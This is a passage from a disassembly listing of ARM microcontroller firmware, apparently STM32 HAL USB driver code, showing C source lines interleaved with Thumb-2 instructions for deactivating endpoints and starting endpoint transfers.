 8006ac8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006acc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006ad0:	833b      	strh	r3, [r7, #24]
 8006ad2:	687a      	ldr	r2, [r7, #4]
 8006ad4:	683b      	ldr	r3, [r7, #0]
 8006ad6:	781b      	ldrb	r3, [r3, #0]
 8006ad8:	009b      	lsls	r3, r3, #2
 8006ada:	441a      	add	r2, r3
 8006adc:	8b3b      	ldrh	r3, [r7, #24]
 8006ade:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006ae2:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006ae6:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006aea:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006aee:	b29b      	uxth	r3, r3
 8006af0:	8013      	strh	r3, [r2, #0]

      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006af2:	687a      	ldr	r2, [r7, #4]
 8006af4:	683b      	ldr	r3, [r7, #0]
 8006af6:	781b      	ldrb	r3, [r3, #0]
 8006af8:	009b      	lsls	r3, r3, #2
 8006afa:	4413      	add	r3, r2
 8006afc:	881b      	ldrh	r3, [r3, #0]
 8006afe:	b29b      	uxth	r3, r3
 8006b00:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006b04:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b08:	82fb      	strh	r3, [r7, #22]
 8006b0a:	687a      	ldr	r2, [r7, #4]
 8006b0c:	683b      	ldr	r3, [r7, #0]
 8006b0e:	781b      	ldrb	r3, [r3, #0]
 8006b10:	009b      	lsls	r3, r3, #2
 8006b12:	441a      	add	r2, r3
 8006b14:	8afb      	ldrh	r3, [r7, #22]
 8006b16:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b1a:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b1e:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006b22:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b26:	b29b      	uxth	r3, r3
 8006b28:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006b2a:	687a      	ldr	r2, [r7, #4]
 8006b2c:	683b      	ldr	r3, [r7, #0]
 8006b2e:	781b      	ldrb	r3, [r3, #0]
 8006b30:	009b      	lsls	r3, r3, #2
 8006b32:	4413      	add	r3, r2
 8006b34:	881b      	ldrh	r3, [r3, #0]
 8006b36:	b29b      	uxth	r3, r3
 8006b38:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b3c:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006b40:	82bb      	strh	r3, [r7, #20]
 8006b42:	687a      	ldr	r2, [r7, #4]
 8006b44:	683b      	ldr	r3, [r7, #0]
 8006b46:	781b      	ldrb	r3, [r3, #0]
 8006b48:	009b      	lsls	r3, r3, #2
 8006b4a:	441a      	add	r2, r3
 8006b4c:	8abb      	ldrh	r3, [r7, #20]
 8006b4e:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006b52:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006b56:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006b5a:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006b5e:	b29b      	uxth	r3, r3
 8006b60:	8013      	strh	r3, [r2, #0]
 8006b62:	e0a3      	b.n	8006cac <USB_DeactivateEndpoint+0x3cc>
    }
    else
    {
      /* Clear the data toggle bits for the endpoint IN/OUT*/
      PCD_CLEAR_RX_DTOG(USBx, ep->num);
 8006b64:	687a      	ldr	r2, [r7, #4]
 8006b66:	683b      	ldr	r3, [r7, #0]
 8006b68:	781b      	ldrb	r3, [r3, #0]
 8006b6a:	009b      	lsls	r3, r3, #2
 8006b6c:	4413      	add	r3, r2
 8006b6e:	881b      	ldrh	r3, [r3, #0]
 8006b70:	85fb      	strh	r3, [r7, #46]	; 0x2e
 8006b72:	8dfb      	ldrh	r3, [r7, #46]	; 0x2e
 8006b74:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8006b78:	2b00      	cmp	r3, #0
 8006b7a:	d01b      	beq.n	8006bb4 <USB_DeactivateEndpoint+0x2d4>
 8006b7c:	687a      	ldr	r2, [r7, #4]
 8006b7e:	683b      	ldr	r3, [r7, #0]
 8006b80:	781b      	ldrb	r3, [r3, #0]
 8006b82:	009b      	lsls	r3, r3, #2
 8006b84:	4413      	add	r3, r2
 8006b86:	881b      	ldrh	r3, [r3, #0]
 8006b88:	b29b      	uxth	r3, r3
 8006b8a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006b8e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006b92:	85bb      	strh	r3, [r7, #44]	; 0x2c
 8006b94:	687a      	ldr	r2, [r7, #4]
 8006b96:	683b      	ldr	r3, [r7, #0]
 8006b98:	781b      	ldrb	r3, [r3, #0]
 8006b9a:	009b      	lsls	r3, r3, #2
 8006b9c:	441a      	add	r2, r3
 8006b9e:	8dbb      	ldrh	r3, [r7, #44]	; 0x2c
 8006ba0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006ba4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006ba8:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006bac:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006bb0:	b29b      	uxth	r3, r3
 8006bb2:	8013      	strh	r3, [r2, #0]
      PCD_CLEAR_TX_DTOG(USBx, ep->num);
 8006bb4:	687a      	ldr	r2, [r7, #4]
 8006bb6:	683b      	ldr	r3, [r7, #0]
 8006bb8:	781b      	ldrb	r3, [r3, #0]
 8006bba:	009b      	lsls	r3, r3, #2
 8006bbc:	4413      	add	r3, r2
 8006bbe:	881b      	ldrh	r3, [r3, #0]
 8006bc0:	857b      	strh	r3, [r7, #42]	; 0x2a
 8006bc2:	8d7b      	ldrh	r3, [r7, #42]	; 0x2a
 8006bc4:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006bc8:	2b00      	cmp	r3, #0
 8006bca:	d01b      	beq.n	8006c04 <USB_DeactivateEndpoint+0x324>
 8006bcc:	687a      	ldr	r2, [r7, #4]
 8006bce:	683b      	ldr	r3, [r7, #0]
 8006bd0:	781b      	ldrb	r3, [r3, #0]
 8006bd2:	009b      	lsls	r3, r3, #2
 8006bd4:	4413      	add	r3, r2
 8006bd6:	881b      	ldrh	r3, [r3, #0]
 8006bd8:	b29b      	uxth	r3, r3
 8006bda:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006bde:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006be2:	853b      	strh	r3, [r7, #40]	; 0x28
 8006be4:	687a      	ldr	r2, [r7, #4]
 8006be6:	683b      	ldr	r3, [r7, #0]
 8006be8:	781b      	ldrb	r3, [r3, #0]
 8006bea:	009b      	lsls	r3, r3, #2
 8006bec:	441a      	add	r2, r3
 8006bee:	8d3b      	ldrh	r3, [r7, #40]	; 0x28
 8006bf0:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006bf4:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006bf8:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006bfc:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8006c00:	b29b      	uxth	r3, r3
 8006c02:	8013      	strh	r3, [r2, #0]
      PCD_RX_DTOG(USBx, ep->num);
 8006c04:	687a      	ldr	r2, [r7, #4]
 8006c06:	683b      	ldr	r3, [r7, #0]
 8006c08:	781b      	ldrb	r3, [r3, #0]
 8006c0a:	009b      	lsls	r3, r3, #2
 8006c0c:	4413      	add	r3, r2
 8006c0e:	881b      	ldrh	r3, [r3, #0]
 8006c10:	b29b      	uxth	r3, r3
 8006c12:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006c16:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006c1a:	84fb      	strh	r3, [r7, #38]	; 0x26
 8006c1c:	687a      	ldr	r2, [r7, #4]
 8006c1e:	683b      	ldr	r3, [r7, #0]
 8006c20:	781b      	ldrb	r3, [r3, #0]
 8006c22:	009b      	lsls	r3, r3, #2
 8006c24:	441a      	add	r2, r3
 8006c26:	8cfb      	ldrh	r3, [r7, #38]	; 0x26
 8006c28:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006c2c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006c30:	f443 4340 	orr.w	r3, r3, #49152	; 0xc000
 8006c34:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006c38:	b29b      	uxth	r3, r3
 8006c3a:	8013      	strh	r3, [r2, #0]

      /* Configure DISABLE status for the Endpoint*/
      PCD_SET_EP_TX_STATUS(USBx, ep->num, USB_EP_TX_DIS);
 8006c3c:	687a      	ldr	r2, [r7, #4]
 8006c3e:	683b      	ldr	r3, [r7, #0]
 8006c40:	781b      	ldrb	r3, [r3, #0]
 8006c42:	009b      	lsls	r3, r3, #2
 8006c44:	4413      	add	r3, r2
 8006c46:	881b      	ldrh	r3, [r3, #0]
 8006c48:	b29b      	uxth	r3, r3
 8006c4a:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006c4e:	f023 0340 	bic.w	r3, r3, #64	; 0x40
 8006c52:	84bb      	strh	r3, [r7, #36]	; 0x24
 8006c54:	687a      	ldr	r2, [r7, #4]
 8006c56:	683b      	ldr	r3, [r7, #0]
 8006c58:	781b      	ldrb	r3, [r3, #0]
 8006c5a:	009b      	lsls	r3, r3, #2
 8006c5c:	441a      	add	r2, r3
 8006c5e:	8cbb      	ldrh	r3, [r7, #36]	; 0x24
 8006c60:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006c64:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006c68:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006c6c:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006c70:	b29b      	uxth	r3, r3
 8006c72:	8013      	strh	r3, [r2, #0]
      PCD_SET_EP_RX_STATUS(USBx, ep->num, USB_EP_RX_DIS);
 8006c74:	687a      	ldr	r2, [r7, #4]
 8006c76:	683b      	ldr	r3, [r7, #0]
 8006c78:	781b      	ldrb	r3, [r3, #0]
 8006c7a:	009b      	lsls	r3, r3, #2
 8006c7c:	4413      	add	r3, r2
 8006c7e:	881b      	ldrh	r3, [r3, #0]
 8006c80:	b29b      	uxth	r3, r3
 8006c82:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8006c86:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006c8a:	847b      	strh	r3, [r7, #34]	; 0x22
 8006c8c:	687a      	ldr	r2, [r7, #4]
 8006c8e:	683b      	ldr	r3, [r7, #0]
 8006c90:	781b      	ldrb	r3, [r3, #0]
 8006c92:	009b      	lsls	r3, r3, #2
 8006c94:	441a      	add	r2, r3
 8006c96:	8c7b      	ldrh	r3, [r7, #34]	; 0x22
 8006c98:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006c9c:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006ca0:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8006ca4:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006ca8:	b29b      	uxth	r3, r3
 8006caa:	8013      	strh	r3, [r2, #0]
    }
  }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  return HAL_OK;
 8006cac:	2300      	movs	r3, #0
}
 8006cae:	4618      	mov	r0, r3
 8006cb0:	3734      	adds	r7, #52	; 0x34
 8006cb2:	46bd      	mov	sp, r7
 8006cb4:	f85d 7b04 	ldr.w	r7, [sp], #4
 8006cb8:	4770      	bx	lr

08006cba <USB_EPStartXfer>:
  * @param  USBx Selected device
  * @param  ep pointer to endpoint structure
  * @retval HAL status
  */
HAL_StatusTypeDef USB_EPStartXfer(USB_TypeDef *USBx, USB_EPTypeDef *ep)
{
 8006cba:	b580      	push	{r7, lr}
 8006cbc:	b0c2      	sub	sp, #264	; 0x108
 8006cbe:	af00      	add	r7, sp, #0
 8006cc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cc4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006cc8:	6018      	str	r0, [r3, #0]
 8006cca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cd2:	6019      	str	r1, [r3, #0]
  uint16_t pmabuffer;
  uint16_t wEPVal;
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

  /* IN endpoint */
  if (ep->is_in == 1U)
 8006cd4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cd8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cdc:	681b      	ldr	r3, [r3, #0]
 8006cde:	785b      	ldrb	r3, [r3, #1]
 8006ce0:	2b01      	cmp	r3, #1
 8006ce2:	f040 86b7 	bne.w	8007a54 <USB_EPStartXfer+0xd9a>
  {
    /*Multi packet transfer*/
    if (ep->xfer_len > ep->maxpacket)
 8006ce6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cea:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cee:	681b      	ldr	r3, [r3, #0]
 8006cf0:	699a      	ldr	r2, [r3, #24]
 8006cf2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006cf6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006cfa:	681b      	ldr	r3, [r3, #0]
 8006cfc:	691b      	ldr	r3, [r3, #16]
 8006cfe:	429a      	cmp	r2, r3
 8006d00:	d908      	bls.n	8006d14 <USB_EPStartXfer+0x5a>
    {
      len = ep->maxpacket;
 8006d02:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d06:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d0a:	681b      	ldr	r3, [r3, #0]
 8006d0c:	691b      	ldr	r3, [r3, #16]
 8006d0e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
 8006d12:	e007      	b.n	8006d24 <USB_EPStartXfer+0x6a>
    }
    else
    {
      len = ep->xfer_len;
 8006d14:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d18:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d1c:	681b      	ldr	r3, [r3, #0]
 8006d1e:	699b      	ldr	r3, [r3, #24]
 8006d20:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
    }

    /* configure and validate Tx endpoint */
    if (ep->doublebuffer == 0U)
 8006d24:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d28:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d2c:	681b      	ldr	r3, [r3, #0]
 8006d2e:	7b1b      	ldrb	r3, [r3, #12]
 8006d30:	2b00      	cmp	r3, #0
 8006d32:	d13a      	bne.n	8006daa <USB_EPStartXfer+0xf0>
    {
      USB_WritePMA(USBx, ep->xfer_buff, ep->pmaadress, (uint16_t)len);
 8006d34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d3c:	681b      	ldr	r3, [r3, #0]
 8006d3e:	6959      	ldr	r1, [r3, #20]
 8006d40:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d44:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d48:	681b      	ldr	r3, [r3, #0]
 8006d4a:	88da      	ldrh	r2, [r3, #6]
 8006d4c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006d50:	b29b      	uxth	r3, r3
 8006d52:	f507 7084 	add.w	r0, r7, #264	; 0x108
 8006d56:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 8006d5a:	6800      	ldr	r0, [r0, #0]
 8006d5c:	f001 fcb9 	bl	80086d2 <USB_WritePMA>
      PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8006d60:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d64:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d68:	681b      	ldr	r3, [r3, #0]
 8006d6a:	613b      	str	r3, [r7, #16]
 8006d6c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d70:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006d74:	681b      	ldr	r3, [r3, #0]
 8006d76:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006d7a:	b29b      	uxth	r3, r3
 8006d7c:	461a      	mov	r2, r3
 8006d7e:	693b      	ldr	r3, [r7, #16]
 8006d80:	4413      	add	r3, r2
 8006d82:	613b      	str	r3, [r7, #16]
 8006d84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006d88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006d8c:	681b      	ldr	r3, [r3, #0]
 8006d8e:	781b      	ldrb	r3, [r3, #0]
 8006d90:	00da      	lsls	r2, r3, #3
 8006d92:	693b      	ldr	r3, [r7, #16]
 8006d94:	4413      	add	r3, r2
 8006d96:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8006d9a:	60fb      	str	r3, [r7, #12]
 8006d9c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006da0:	b29a      	uxth	r2, r3
 8006da2:	68fb      	ldr	r3, [r7, #12]
 8006da4:	801a      	strh	r2, [r3, #0]
 8006da6:	f000 be1f 	b.w	80079e8 <USB_EPStartXfer+0xd2e>
    }
#if (USE_USB_DOUBLE_BUFFER == 1U)
    else
    {
      /* double buffer bulk management */
      if (ep->type == EP_TYPE_BULK)
 8006daa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dae:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006db2:	681b      	ldr	r3, [r3, #0]
 8006db4:	78db      	ldrb	r3, [r3, #3]
 8006db6:	2b02      	cmp	r3, #2
 8006db8:	f040 8462 	bne.w	8007680 <USB_EPStartXfer+0x9c6>
      {
        if (ep->xfer_len_db > ep->maxpacket)
 8006dbc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dc0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dc4:	681b      	ldr	r3, [r3, #0]
 8006dc6:	6a1a      	ldr	r2, [r3, #32]
 8006dc8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dcc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dd0:	681b      	ldr	r3, [r3, #0]
 8006dd2:	691b      	ldr	r3, [r3, #16]
 8006dd4:	429a      	cmp	r2, r3
 8006dd6:	f240 83df 	bls.w	8007598 <USB_EPStartXfer+0x8de>
        {
          /* enable double buffer */
          PCD_SET_BULK_EP_DBUF(USBx, ep->num);
 8006dda:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006dde:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006de2:	681a      	ldr	r2, [r3, #0]
 8006de4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006de8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006dec:	681b      	ldr	r3, [r3, #0]
 8006dee:	781b      	ldrb	r3, [r3, #0]
 8006df0:	009b      	lsls	r3, r3, #2
 8006df2:	4413      	add	r3, r2
 8006df4:	881b      	ldrh	r3, [r3, #0]
 8006df6:	b29b      	uxth	r3, r3
 8006df8:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8006dfc:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8006e00:	f8a7 3056 	strh.w	r3, [r7, #86]	; 0x56
 8006e04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e0c:	681a      	ldr	r2, [r3, #0]
 8006e0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e12:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e16:	681b      	ldr	r3, [r3, #0]
 8006e18:	781b      	ldrb	r3, [r3, #0]
 8006e1a:	009b      	lsls	r3, r3, #2
 8006e1c:	441a      	add	r2, r3
 8006e1e:	f8b7 3056 	ldrh.w	r3, [r7, #86]	; 0x56
 8006e22:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8006e26:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8006e2a:	f443 4301 	orr.w	r3, r3, #33024	; 0x8100
 8006e2e:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8006e32:	b29b      	uxth	r3, r3
 8006e34:	8013      	strh	r3, [r2, #0]

          /* each Time to write in PMA xfer_len_db will */
          ep->xfer_len_db -= len;
 8006e36:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e3a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e3e:	681b      	ldr	r3, [r3, #0]
 8006e40:	6a1a      	ldr	r2, [r3, #32]
 8006e42:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006e46:	1ad2      	subs	r2, r2, r3
 8006e48:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e4c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e50:	681b      	ldr	r3, [r3, #0]
 8006e52:	621a      	str	r2, [r3, #32]

          /* Fill the two first buffer in the Buffer0 & Buffer1 */
          if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 8006e54:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e58:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e5c:	681a      	ldr	r2, [r3, #0]
 8006e5e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e62:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e66:	681b      	ldr	r3, [r3, #0]
 8006e68:	781b      	ldrb	r3, [r3, #0]
 8006e6a:	009b      	lsls	r3, r3, #2
 8006e6c:	4413      	add	r3, r2
 8006e6e:	881b      	ldrh	r3, [r3, #0]
 8006e70:	b29b      	uxth	r3, r3
 8006e72:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8006e76:	2b00      	cmp	r3, #0
 8006e78:	f000 81c7 	beq.w	800720a <USB_EPStartXfer+0x550>
          {
            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8006e7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e80:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006e84:	681b      	ldr	r3, [r3, #0]
 8006e86:	633b      	str	r3, [r7, #48]	; 0x30
 8006e88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006e90:	681b      	ldr	r3, [r3, #0]
 8006e92:	785b      	ldrb	r3, [r3, #1]
 8006e94:	2b00      	cmp	r3, #0
 8006e96:	d177      	bne.n	8006f88 <USB_EPStartXfer+0x2ce>
 8006e98:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006e9c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006ea0:	681b      	ldr	r3, [r3, #0]
 8006ea2:	62bb      	str	r3, [r7, #40]	; 0x28
 8006ea4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ea8:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006eac:	681b      	ldr	r3, [r3, #0]
 8006eae:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006eb2:	b29b      	uxth	r3, r3
 8006eb4:	461a      	mov	r2, r3
 8006eb6:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006eb8:	4413      	add	r3, r2
 8006eba:	62bb      	str	r3, [r7, #40]	; 0x28
 8006ebc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006ec0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006ec4:	681b      	ldr	r3, [r3, #0]
 8006ec6:	781b      	ldrb	r3, [r3, #0]
 8006ec8:	00da      	lsls	r2, r3, #3
 8006eca:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8006ecc:	4413      	add	r3, r2
 8006ece:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8006ed2:	627b      	str	r3, [r7, #36]	; 0x24
 8006ed4:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ed6:	881b      	ldrh	r3, [r3, #0]
 8006ed8:	b29b      	uxth	r3, r3
 8006eda:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8006ede:	b29a      	uxth	r2, r3
 8006ee0:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006ee2:	801a      	strh	r2, [r3, #0]
 8006ee4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ee8:	2b3e      	cmp	r3, #62	; 0x3e
 8006eea:	d921      	bls.n	8006f30 <USB_EPStartXfer+0x276>
 8006eec:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ef0:	095b      	lsrs	r3, r3, #5
 8006ef2:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006ef6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006efa:	f003 031f 	and.w	r3, r3, #31
 8006efe:	2b00      	cmp	r3, #0
 8006f00:	d104      	bne.n	8006f0c <USB_EPStartXfer+0x252>
 8006f02:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f06:	3b01      	subs	r3, #1
 8006f08:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006f0c:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f0e:	881b      	ldrh	r3, [r3, #0]
 8006f10:	b29a      	uxth	r2, r3
 8006f12:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f16:	b29b      	uxth	r3, r3
 8006f18:	029b      	lsls	r3, r3, #10
 8006f1a:	b29b      	uxth	r3, r3
 8006f1c:	4313      	orrs	r3, r2
 8006f1e:	b29b      	uxth	r3, r3
 8006f20:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f24:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f28:	b29a      	uxth	r2, r3
 8006f2a:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f2c:	801a      	strh	r2, [r3, #0]
 8006f2e:	e050      	b.n	8006fd2 <USB_EPStartXfer+0x318>
 8006f30:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f34:	2b00      	cmp	r3, #0
 8006f36:	d10a      	bne.n	8006f4e <USB_EPStartXfer+0x294>
 8006f38:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f3a:	881b      	ldrh	r3, [r3, #0]
 8006f3c:	b29b      	uxth	r3, r3
 8006f3e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006f42:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006f46:	b29a      	uxth	r2, r3
 8006f48:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f4a:	801a      	strh	r2, [r3, #0]
 8006f4c:	e041      	b.n	8006fd2 <USB_EPStartXfer+0x318>
 8006f4e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f52:	085b      	lsrs	r3, r3, #1
 8006f54:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006f58:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006f5c:	f003 0301 	and.w	r3, r3, #1
 8006f60:	2b00      	cmp	r3, #0
 8006f62:	d004      	beq.n	8006f6e <USB_EPStartXfer+0x2b4>
 8006f64:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f68:	3301      	adds	r3, #1
 8006f6a:	f8c7 3100 	str.w	r3, [r7, #256]	; 0x100
 8006f6e:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f70:	881b      	ldrh	r3, [r3, #0]
 8006f72:	b29a      	uxth	r2, r3
 8006f74:	f8d7 3100 	ldr.w	r3, [r7, #256]	; 0x100
 8006f78:	b29b      	uxth	r3, r3
 8006f7a:	029b      	lsls	r3, r3, #10
 8006f7c:	b29b      	uxth	r3, r3
 8006f7e:	4313      	orrs	r3, r2
 8006f80:	b29a      	uxth	r2, r3
 8006f82:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8006f84:	801a      	strh	r2, [r3, #0]
 8006f86:	e024      	b.n	8006fd2 <USB_EPStartXfer+0x318>
 8006f88:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f8c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8006f90:	681b      	ldr	r3, [r3, #0]
 8006f92:	785b      	ldrb	r3, [r3, #1]
 8006f94:	2b01      	cmp	r3, #1
 8006f96:	d11c      	bne.n	8006fd2 <USB_EPStartXfer+0x318>
 8006f98:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8006f9c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8006fa0:	681b      	ldr	r3, [r3, #0]
 8006fa2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8006fa6:	b29b      	uxth	r3, r3
 8006fa8:	461a      	mov	r2, r3
 8006faa:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8006fac:	4413      	add	r3, r2
 8006fae:	633b      	str	r3, [r7, #48]	; 0x30
 8006fb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
